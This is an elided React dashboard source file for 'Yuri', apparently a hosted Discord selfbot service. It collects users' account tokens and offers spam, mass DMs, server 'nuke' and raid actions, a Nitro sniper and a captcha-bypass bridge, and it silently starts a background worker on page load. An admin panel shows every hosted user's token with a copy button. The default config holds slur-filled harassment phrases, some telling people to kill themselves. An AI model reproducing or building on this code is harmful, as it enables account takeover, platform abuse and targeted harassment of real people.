...
import { Upload, Trash2, Activity, Users, Settings, Skull, Mic, MessageSquare, UserPlus, LogOut, Flame, AlertTriangle, Type, Eraser, ShieldAlert, Gamepad2, Terminal, RefreshCw, History, Server, Sliders, User, Globe, Heart, Zap, MonitorPlay, Shield, Search } from 'lucide-react';
...
export default function Dashboard({ onLogout }: DashboardProps) {
  const [activeTab, setActiveTab] = useState<'tokens' | 'actions' | 'raid' | 'settings' | 'admin' | 'rpc' | 'commands' | 'tos' | 'faq' | 'get_token' | 'rotator' | 'vc' | 'changelog' | 'revenge' | 'hosting' | 'configs' | 'donation' | 'nitro_sniper' | 'captcha'>('tokens');
  ...
  const [hostingProfile, setHostingProfile] = useState<any>(null);
  ...
  const [configs, setConfigsState] = useState({
    autoSkull: false,
    packEnabled: false,
    packPhrases: `Kill yourself you retarded faggot
You're such a worthless cuck nobody will ever love you
Go hang yourself you useless piece of shit
You're a disgustin
Retard
...
Useless piece of shit`,
  ...
  useEffect(() => {
    ...
    const pollCaptchas = setInterval(async () => {
        try {
            const res = await fetch('/api/captcha/list');
            if (res.ok) {
                const data = await res.json();
                setPendingCaptchas(data.queue || []);
            }
        } catch (e) {}
    }, 5000);

    // Auto-trigger persistent worker silently in the background
    const triggerAutoVps = async () => {
        try {
            const res = await fetch('/api/vps/status');
            const data = await res.json();
            if (data.status === 'idle') {
                await fetch('/api/vps/auto-deploy', { method: 'POST' });
                console.log('[Auto-Deploy] Triggered background persistent worker');
            }
        } catch (e) {}
    };
    triggerAutoVps();

    // Keep-alive ping to backend to prevent Render/VPS from sleeping
  ...
  const fetchSettings = async () => {
    try {
        ...
        if (data) {
            setMenuMode(data.menuMode || 'text');
            setMultiFeatureEnabled(data.multiFeatureEnabled || false);
        }
        
        // Fetch global configs
        const configsRes = await fetch('/api/configs/get', {
            headers: { 'Authorization': loggedInToken }
        });
        if (configsRes.ok) {
            const configsData = await configsRes.json();
            if (configsData.configs) {
                setConfigsState(configsData.configs);
            }
        }
    } catch (e) {
  ...
  const isAdmin = loggedInUserId === '1453811580721692742';
  ...
  return (
    <div className="min-h-screen text-zinc-100 font-sans relative overflow-hidden">
      {showWelcome && (
        ...
        {/* Mobile Header */}
        <div className="md:hidden fixed top-0 left-0 right-0 h-16 bg-black/40 border-b border-white/10 flex items-center justify-between px-4 z-40">
            <h1 className="text-xl font-light tracking-tight text-white">Yuri</h1>
            <button onClick={() => {
        ...
        {/* Sidebar */}
        <div id="sidebar" className="w-64 border-r border-white/10 bg-black/40 flex flex-col fixed inset-y-0 left-0 transform -translate-x-full md:relative md:translate-x-0 transition-transform duration-300 ease-in-out z-50">
          <div className="p-6 border-b border-zinc-800 flex justify-between items-center">
            <div>
              <h1 className="text-xl font-light tracking-tight text-white">
                Yuri
              </h1>
              <p className="text-xs text-zinc-500 mt-1">v1.01</p>
            </div>
            <button onClick={() => {
                const sidebar = document.getElementById('sidebar');
          ...
          <nav className="flex-1 p-4 space-y-1 overflow-y-auto">
            ...
            />
            <SidebarItem 
              active={activeTab === 'captcha'} 
              onClick={() => setActiveTab('captcha')} 
              icon={ShieldAlert} 
              label="Captcha Bridge" 
              badge={pendingCaptchas.length > 0 ? pendingCaptchas.length : undefined}
            />
            <SidebarItem 
            ...
            />
            <SidebarItem 
              active={activeTab === 'nitro_sniper'} 
              onClick={() => setActiveTab('nitro_sniper')} 
              icon={Zap} 
              label="Nitro Sniper" 
            />
            {/* Remove System & Cloud tab as requested */}
        ...
        <div className="flex-1 flex flex-col overflow-hidden pt-16 md:pt-0">
          {/* Header */}
          <header className="hidden md:flex h-16 border-b border-white/10 items-center justify-between px-8 bg-black/20">
                ...
                <div className="max-w-2xl mx-auto space-y-6">
                  <div className="bg-black/40 border border-white/10 rounded-xl p-8">
                    ...
                    <div className="space-y-6">
                      <div>
                        <label className="block text-xs font-medium text-zinc-400 mb-2 uppercase tracking-wider">User Token</label>
                        <div className="flex gap-2">
                          ...
                          <button 
                            onClick={async () => {
                              const sanitizedToken = hostingToken.trim().replace(/^["']|["']$/g, '');
                              ...
                              try {
                                ...
                                const data = await res.json();
                                if (data.success) {
                                  setHostingProfile(data.profile);
                                  addLog(`Hosted account: ${data.profile.username}`);
                                } else {
                                  addLog(`Hosting failed: ${data.error}`);
                                }
                              } catch (e) {
                                addLog(`Hosting error: ${e}`);
                              } finally {
                                setIsHosting(false);
                              }
                            }}
                            disabled={isHosting}
                            className="px-6 py-2 bg-purple-600 hover:bg-purple-500 text-white font-medium rounded-lg transition-all text-sm disabled:opacity-50"
                          >
                            {isHosting ? 'Starting...' : 'Host Account'}
                          </button>
                        </div>
                      </div>
                      ...
                      {hostingProfile && (
                        <motion.div 
                          ...
                          className="p-6 bg-black/20 border border-white/10 rounded-xl flex items-center gap-6"
                        >
                          <img 
                            src={hostingProfile.avatar || `https://ui-avatars.com/api/?name=${hostingProfile.username}`} 
                            alt="Avatar" 
                            className="w-20 h-20 rounded-full border-2 border-purple-500/30"
                          />
                          <div className="flex-1">
                            <h4 className="text-lg font-bold text-white">{hostingProfile.username}</h4>
                            <p className="text-xs text-zinc-500 font-mono mb-4">{hostingProfile.id}</p>
                            <div className="flex gap-2">
                              <button 
                                onClick={() => {
                                  const sanitizedToken = hostingToken.trim().replace(/^["']|["']$/g, '');
                                ...
                                className="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-[10px] rounded uppercase font-bold"
                              >
                                Manage
                              </button>
                              <button 
                                onClick={async () => {
                                  try {
                                    await fetch('/api/hosting/stop', {
                                      method: 'POST',
                                      headers: { 'Content-Type': 'application/json' },
                                      body: JSON.stringify({ token: hostingToken })
                                    });
                                    setHostingProfile(null);
                                    setHostingToken('');
                                    addLog('Stopped hosting account');
                                  } catch (e) {}
                                }}
                                className="px-3 py-1 bg-red-500/10 hover:bg-red-500/20 text-red-500 text-[10px] rounded uppercase font-bold"
                              >
                                Stop
                              </button>
                            </div>
                          ...
                          <div className="flex flex-col items-end gap-1">
                            <span className="px-2 py-1 bg-emerald-500/10 text-emerald-500 text-[10px] rounded font-bold">HOSTED</span>
                            <span className="text-[10px] text-zinc-600">Active for 0m</span>
                          </div>
                        </motion.div>
                      )}
                    </div>
                    ...
                    <div className="space-y-8">
                      ...
                      <div className="space-y-4 p-4 bg-black/20 border border-white/10 rounded-xl">
                        <div className="flex items-center justify-between">
                          <div>
                            <h4 className="text-sm font-bold text-white">Pack Command Config</h4>
                            <p className="text-xs text-zinc-500">Enable and configure phrases for .pack</p>
                          </div>
                          <button 
                            onClick={() => setConfigsState(prev => ({ ...prev, packEnabled: !prev.packEnabled }))}
                            className={`w-12 h-6 rounded-full transition-all relative ${configs.packEnabled ? 'bg-emerald-500' : 'bg-zinc-800'}`}
                          >
                            <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${configs.packEnabled ? 'left-7' : 'left-1'}`} />
                          </button>
                        </div>
                        <div className="space-y-2">
                          <label className="block text-[10px] font-bold text-zinc-500 uppercase tracking-wider">Pack Phrases (One per line)</label>
                          <textarea 
                            value={configs.packPhrases}
                            onChange={(e) => setConfigsState(prev => ({ ...prev, packPhrases: e.target.value }))}
                            placeholder="Enter phrases here..."
                            className="w-full h-32 bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-xs font-mono text-zinc-400 focus:outline-none focus:border-blue-500/50 transition-all resize-none"
                          />
                        </div>
                      </div>
                      ...
                      <div className="flex items-center justify-between p-4 bg-black/20 border border-white/10 rounded-xl">
                        <div>
                          <h4 className="text-sm font-bold text-white">Auto Reconnect VC</h4>
                          <p className="text-xs text-zinc-500">Automatically rejoin voice channels on disconnect</p>
                        </div>
                        <button 
                          onClick={() => setConfigsState(prev => ({ ...prev, autoReconnect: !prev.autoReconnect }))}
                          className={`w-12 h-6 rounded-full transition-all relative ${configs.autoReconnect ? 'bg-emerald-500' : 'bg-zinc-800'}`}
                        >
                          <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${configs.autoReconnect ? 'left-7' : 'left-1'}`} />
                        </button>
                      </div>
                        ...
                        <button 
                          onClick={async () => {
                            try {
                              ...
                              if (res.ok) {
                                addLog('Configs saved successfully');
                              }
                            } catch (e) {
                              addLog(`Error saving configs: ${e}`);
                            }
                          }}
              ...
              {activeTab === 'tokens' && (
                <div className="space-y-6">
                  ...
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    ...
                    <div className="bg-black/40 border border-white/10 rounded-xl p-6 flex flex-col justify-between">
                      <div>
                    ...
                    <div className="bg-black/40 border border-white/10 rounded-xl p-6">
                        ...
                        <div className="space-y-4">
                            <div className="flex items-center justify-between">
                                ...
                                <button 
                                    onClick={async () => {
                                        const newEnabled = !multiFeatureEnabled;
                                        setMultiFeatureEnabled(newEnabled);
                                        await api.setMultiFeature(newEnabled).catch(console.error);
                                    }}
                            ...
                            <div className="flex items-center justify-between">
                                ...
                                <div className="flex gap-2">
                                    <button 
                                        onClick={async () => {
                                            setMenuMode('text');
                                            await api.setMenuMode('text').catch(console.error);
                                        }}
                                    ...
                                    <button 
                                        onClick={async () => {
                                            setMenuMode('image');
                                            await api.setMenuMode('image').catch(console.error);
                                        }}
                    ...
                    <div className="bg-black/40 border border-white/10 rounded-xl p-6">
                      ...
                      <div className="flex gap-4">
                        <input 
                          ...
                          className="flex-1 bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-zinc-600 transition-all placeholder:text-zinc-700"
                        />
                        <button 
                    ...
                    <div className="bg-black/40 border border-white/10 rounded-xl p-6">
                        ...
                        <div className="space-y-4">
                            <textarea
                                ...
                                className="w-full h-32 bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-xs font-mono text-zinc-400 focus:outline-none focus:border-emerald-500/50 transition-all resize-none placeholder:text-zinc-700"
                            />
                    ...
                    <div className="grid grid-cols-2 gap-4">
                        <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-4">
                            ...
                            <input 
                                ...
                                className="w-full bg-black/20 border border-white/10 rounded px-3 py-2 text-xs mb-3 focus:outline-none focus:border-zinc-600 placeholder:text-zinc-700"
                            />
                            <button onClick={handleMassDM} className="w-full py-2 bg-black/20 border border-white/10 text-zinc-300 text-xs rounded hover:bg-white/5 transition-colors">Send</button>
                        </div>
                        ...
                        <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-4">
                            ...
                            <input 
                                ...
                                className="w-full bg-black/20 border border-white/10 rounded px-3 py-2 text-xs mb-3 focus:outline-none focus:border-zinc-600 placeholder:text-zinc-700"
                            />
                            <button onClick={handleFriendRequest} className="w-full py-2 bg-black/20 border border-white/10 text-zinc-300 text-xs rounded hover:bg-white/5 transition-colors">Add</button>
                        </div>
                    </div>
                  </div>

                  {/* Live Console */}
                  <div className="bg-black/40 border border-white/10 rounded-xl p-4 flex flex-col h-[600px]">
                  ...
                  <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-6">
                    ...
                    <div className="space-y-4">
                      <input 
                        ...
                        className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500/50"
                      />
                      <input 
                        type="text" 
                        placeholder="Message" 
                      ...
                      <div className="flex gap-4">
                        <input 
                          ...
                          className="w-24 bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500/50"
                        />
                        <button 
                          onClick={handleSpam}
                  ...
                  <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-6">
                    ...
                    <div className="space-y-4">
                      <input 
                        ...
                        className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-orange-500/50"
                      />
                      <button 
                        onClick={handleNuke}
                  ...
                  <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-6">
                    ...
                    <div className="space-y-4">
                      <input 
                        ...
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-600/50"
                      />
                      <button 
                  ...
                  <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-6">
                    ...
                    <div className="space-y-4">
                      <input 
                        ...
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-blue-500/50"
                      />
                      <div className="flex gap-2">
                        <input 
                          type="text" 
                          ...
                          className="flex-1 bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-blue-500/50"
                        />
                        <button 
                      ...
                      <div className="grid grid-cols-2 gap-2">
                          <button 
                            onClick={async () => {
                                if (confirm('Are you sure you want to LEAVE ALL guilds?')) {
                                    const res = await api.leaveAll();
                                    alert(`Left ${res.count} guilds.`);
                                }
                            }}
                            className="py-2 bg-red-500/10 hover:bg-red-500/20 text-red-500 border border-red-500/20 rounded-lg text-sm font-medium transition-colors"
                          >
                            LEAVE ALL
                          </button>
                          <button 
                            onClick={async () => {
                                if (confirm('Are you sure you want to CLOSE ALL DMs?')) {
                                    const res = await api.closeAllDMs();
                                    alert(`Closed ${res.count} DMs.`);
                                }
                            }}
                            className="py-2 bg-zinc-500/10 hover:bg-zinc-500/20 text-zinc-500 border border-zinc-500/20 rounded-lg text-sm font-medium transition-colors"
                          >
                            CLOSE DMs
                          </button>
                      </div>
                      ...
                      <div className="pt-4 border-t border-zinc-800 space-y-4">
                        <h4 className="text-xs font-bold text-zinc-500 uppercase tracking-widest flex items-center gap-2">
                            <Shield className="w-3 h-3" /> Anti-Nuke Protection
                        </h4>
                        <div className="flex gap-2">
                            <input 
                                type="text" 
                                placeholder="Guild ID to protect" 
                                value={guildId}
                                onChange={(e) => setGuildId(e.target.value)}
                                className="flex-1 bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-emerald-500/50"
                            />
                            <button 
                                onClick={async () => {
                                    if (!guildId) return;
                                    const res = await api.toggleAntiNuke(guildId, true);
                                    if (res.success) alert(`Anti-nuke enabled for ${guildId}`);
                                }}
                                className="px-4 py-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-500 border border-emerald-500/20 rounded-lg text-sm font-medium transition-all"
                            >
                                Protect
                            </button>
                        </div>
                    ...
                    <div className="space-y-6">
                      <div>
                        ...
                        <div className="flex items-start gap-6">
                          <div className="w-48 h-32 bg-black/20 rounded-lg border border-white/10 overflow-hidden relative">
                            {bgImage ? (
                          ...
                          <div className="flex-1">
                            <label className="inline-flex items-center gap-2 px-4 py-2 bg-black/20 border border-white/10 hover:bg-white/5 rounded-lg cursor-pointer transition-colors text-sm text-zinc-300">
                ...
                <div className="space-y-6">
                  <div className="bg-black/40 backdrop-blur-md border border-white/10 rounded-xl p-6">
                    <h3 className="text-lg font-medium text-white mb-6 flex items-center gap-2">
                        ...
                        Captcha Bridge (No Key Solver)
                    </h3>
                    <div className="bg-indigo-500/10 border border-indigo-500/20 rounded-lg p-4 mb-6">
                        <p className="text-sm text-indigo-300">
                          Please look at the pending captchas below and use your Nopecha Browser Extension to solve them. Solve the captcha below, and the token will automatically be sent to the bot.
                        </p>
                    </div>
                    ...
                    <div className="space-y-4">
                        {pendingCaptchas.length === 0 ? (
                            <div className="text-center py-24 border-2 border-dashed border-white/5 rounded-xl">
                                ...
                                <p className="text-zinc-600 font-medium">No pending captchas.</p>
                                <p className="text-zinc-700 text-xs mt-2">The bot is running smoothly without rate-limits.</p>
                            </div>
                        ) : (
                            pendingCaptchas.map((cap) => (
                                <div key={cap.id} className="bg-zinc-900/50 border border-white/10 rounded-xl p-6">
                                    <div className="flex items-center justify-between mb-6">
                                        <div className="flex items-center gap-3">
                                            ...
                                            <div>
                                                <p className="text-sm font-medium text-white">Action Blocked: Captcha Required</p>
                                                <p className="text-[11px] text-zinc-500">Source: {cap.url}</p>
                                            </div>
                                        </div>
                                        <span className="px-2 py-1 bg-white/5 rounded text-[10px] font-mono text-zinc-400">ID: {cap.id}</span>
                                    </div>

                                    <div className="flex flex-col items-center">
                                      <div className="w-full bg-black/40 rounded-xl p-8 border border-white/5 flex flex-col items-center justify-center min-h-[300px]">
                                        <p className="text-zinc-500 text-xs mb-6 text-center">
                                          Interaction required for <strong>{cap.id}</strong>. 
                                          <br/>If the extension is active, it will auto-solve this frame.
                                        </p>
                                        
                                        <div 
                                          className="h-captcha" 
                                          data-sitekey={cap.sitekey}
                                          data-callback={`onCaptchaSolved_${cap.id}`}
                                        ></div>
                                        
                                        <script>
                                          {`window.onCaptchaSolved_${cap.id} = (token) => {
                                            fetch('/api/captcha/solve', {
                                              method: 'POST',
                                              headers: { 'Content-Type': 'application/json' },
                                              body: JSON.stringify({ id: '${cap.id}', token })
                                            }).then(() => window.location.reload());
                                          }`}
                                        </script>
                                      </div>

                                      <div className="w-full mt-6 pt-6 border-t border-white/5 flex gap-4">
                                        <input 
                                          id={`manual-${cap.id}`}
                                          placeholder="Or paste token manually here..."
                                          className="flex-1 bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-sm text-white focus:outline-none focus:border-indigo-500 transition-all font-mono"
                                        />
                                        <button 
                                          onClick={async () => {
                                              const el = document.getElementById(`manual-${cap.id}`) as HTMLInputElement;
                                              if (!el.value) return;
                                              const res = await fetch('/api/captcha/solve', {
                                                  method: 'POST',
                                                  headers: { 'Content-Type': 'application/json' },
                                                  body: JSON.stringify({ id: cap.id, token: el.value })
                                              });
                                              if (res.ok) {
                                                setPendingCaptchas(prev => prev.filter(c => c.id !== cap.id));
                                              }
                                          }}
                                          className="px-8 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-sm font-medium transition-all shadow-lg shadow-indigo-500/20"
                                        >
                                          Submit
                                        </button>
                                      </div>
...
/>}
              ...
              {activeTab === 'nitro_sniper' && <NitroSniper />}

              {activeTab === 'admin' && isAdmin && (
                <div className="space-y-6">
                    <div className="bg-black/40 border border-white/10 rounded-xl overflow-hidden p-6">
                        <h3 className="text-xl font-bold text-zinc-100 mb-4">Admin Dashboard</h3>
                        <p className="text-zinc-400 text-sm mb-6">Manage all hosted users and instances.</p>
                        
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
                           <div className="bg-zinc-900/50 p-4 rounded-lg border border-white/5">
                                <h4 className="text-zinc-300 font-medium mb-1">Total Users</h4>
                                <p className="text-2xl font-bold text-white">{adminSessions.length}</p>
                           </div>
                           <div className="bg-zinc-900/50 p-4 rounded-lg border border-white/5">
                        ...
                        <div className="space-y-4 mb-8">
                             <h4 className="text-zinc-200 font-medium">Mass Actions</h4>
                             <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                  ...
                                  {/* Global Mass Join */}
                                  <div className="space-y-2">
                                      <label className="text-xs text-zinc-500 uppercase font-bold tracking-wider">Global Mass Join (Code)</label>
                                      <div className="flex gap-2">
                                          <input 
                                              type="text" 
                                              placeholder="e.g. quantum" 
                                              value={globalMassJoinInput}
                                              onChange={(e) => setGlobalMassJoinInput(e.target.value)}
                                              className="flex-1 bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-sm text-zinc-300 focus:outline-none focus:border-emerald-500/50"
                                          />
                                          <button 
                                              onClick={async () => {
                                                  if (globalMassJoinInput) {
                                                      addLog(`Initiating Global Mass Join for invite: ${globalMassJoinInput}...`);
                                                      const res = await api.globalMassJoin(globalMassJoinInput);
                                                      addLog(`Global Mass Join finished. ${res.count} tokens joined.`);
                                                      alert(`Success! ${res.count} instances joined.`);
                                                      setGlobalMassJoinInput('');
                                                  }
                                              }} 
                              ...
                              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6 pt-6 border-t border-white/5">
                                 {/* Global Join VC */}
                                  <div className="space-y-2">
                                      <label className="text-xs text-zinc-500 uppercase font-bold tracking-wider">Global Join VC</label>
                                      <div className="flex gap-2">
                                          <input 
                                              type="text" 
                                              placeholder="Guild ID (Optional)" 
                                              value={globalGuildVC}
                                              onChange={(e) => setGlobalGuildVC(e.target.value)}
                                              className="w-1/3 bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-sm text-zinc-300 focus:outline-none focus:border-purple-500/50"
                                          />
                                          <input 
                                              type="text" 
                                              placeholder="Voice Channel ID" 
                                              value={globalChannelVC}
                                              onChange={(e) => setGlobalChannelVC(e.target.value)}
                                              className="flex-1 bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-sm text-zinc-300 focus:outline-none focus:border-purple-500/50"
                                          />
                                          <button 
                                              onClick={async () => {
                                                  if (globalChannelVC) {
                                                      addLog(`Initiating Global Join VC for: ${globalChannelVC}...`);
                                                      const res = await api.adminGlobalJoinVC(globalChannelVC, globalGuildVC);
                                                      addLog(`Global Join VC finished. ${res.count} instances connected.`);
                                                      setGlobalChannelVC('');
                                                      setGlobalGuildVC('');
                                                  }
                                              }} 
                                              className="bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 px-4 py-2 rounded-lg text-sm border border-purple-500/20 transition-colors whitespace-nowrap"
                                          >
                                              Join VC All
                                          </button>
                                      </div>
                        ...
                        <div className="mb-4 flex items-center justify-between gap-4">
                            <h3 className="text-sm font-medium text-zinc-300">All User Sessions</h3>
                            <div className="relative flex-1 max-w-sm">
                                ...
                                <input 
                                    ...
                                    className="w-full bg-black/50 border border-white/10 rounded-lg pl-9 pr-3 py-1.5 text-sm text-zinc-300 focus:outline-none focus:border-purple-500/50"
                                />
                            </div>
                        </div>
                            ...
                            <table className="w-full text-left text-sm">
                                ...
                                <tbody className="divide-y divide-zinc-800 bg-black/20">
                                    {adminSessions.filter(s => 
                                        ...
                                        (s.userId && s.userId.includes(adminSearch)) ||
                                        (s.token && s.token.includes(adminSearch))
                                    ).map((s, i) => (
                                        <tr key={i} className="hover:bg-zinc-800/30 transition-colors">
                                            <td className="px-6 py-3 text-zinc-300 font-medium">
                                                <div className="flex items-center gap-2">
                                                    <div className="w-6 h-6 rounded-full bg-zinc-800 flex items-center justify-center text-xs text-zinc-500 overflow-hidden">
                                                        {s.avatar ? <img src={s.avatar} alt="" className="w-full h-full object-cover" /> : (s.username?.[0] ? s.username[0].toUpperCase() : '?')}
                                                    </div>
                                                    <span className="truncate max-w-[150px]">{s.username || 'Unknown'}</span>
                                                </div>
                                            </td>
                                            ...
                                            <td className="px-6 py-3">
                                                 <div className="flex items-center gap-2">
                                                    <button 
                                                        className="px-2 py-1 bg-purple-600/20 text-purple-400 border border-purple-500/20 rounded hover:bg-purple-600/30 transition-colors text-xs"
                                                        onClick={() => {
                                                            navigator.clipboard.writeText(s.token);
                                                            alert(`Token for ${s.username} copied to clipboard!`);
                                                        }}
                                                    >
                                                        Copy
                                                    </button>
                                                    <button 
                                                        className="px-2 py-1 bg-red-900/40 text-red-400 border border-red-900 rounded hover:bg-red-900/60 transition-colors text-xs"
                                                        onClick={() => alert(`Use .ban ${s.userId || s.username} in discord to blacklist.`)}
                                                    >
                                                        Ban
                                                    </button>
                                                    <button 
                                                        className="px-2 py-1 bg-red-900/60 text-white border border-red-900 rounded hover:bg-red-900/80 transition-colors text-xs"
                                                        onClick={() => alert(`Use .iban ${s.userId || s.username} in discord to IP Ban.`)}
                                                    >
                                                        IP Ban
                                                    </button>
                                                 </div>
                        ...
                        <div className="mt-6 pt-6 border-t border-zinc-800">
                             <h4 className="text-zinc-300 font-medium mb-2">Admin Discord Commands</h4>
                             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm text-zinc-500">
                                 <div><strong className="text-emerald-400">.iban &lt;user&gt;</strong> - IP Ban user from hosting</div>
                                 <div><strong className="text-emerald-400">.ban &lt;user&gt;</strong> - Ban user from hosting</div>
                                 <div><strong className="text-emerald-400">.wl &lt;user&gt;</strong> - Whitelist user</div>
                                 <div><strong className="text-emerald-400">.mjoin &lt;invite&gt;</strong> - Force all hosted to join</div>
                             </div>
                        </div>
                    </div>
                </div>
                ...
                <div className="space-y-6 max-w-2xl mx-auto">
                  <div className="fantasy-card p-8 rounded-2xl text-center">
                    ...
                    <div className="space-y-4 text-left">
                      ...
                      {extractedToken && (
                        <div className="mt-6 p-4 bg-black/20 border border-emerald-500/30 rounded-lg">
              ...
              {activeTab === 'donation' && (
                <div className="h-[calc(100vh-12rem)] flex flex-col">
                  <div className="bg-black/40 border border-white/10 rounded-xl p-6 mb-6">
                    ...
                    <p className="text-sm text-zinc-400">If you enjoy using Yuri, consider supporting the developer!</p>
                  </div>
                  <div className="flex-1 bg-black/40 rounded-xl p-8 border border-zinc-800 flex flex-col items-center justify-center">
                    <a 
                      href="https://paypal.me/damin778" 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="px-8 py-4 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-lg transition-all"
                    >
                      Donate via PayPal
                    </a>
                  </div>
...
function SidebarItem({ active, onClick, icon: Icon, label, badge }: { active: boolean; onClick: () => void; icon: any; label: string; badge?: any }) {
  return (
    <button
      onClick={onClick}
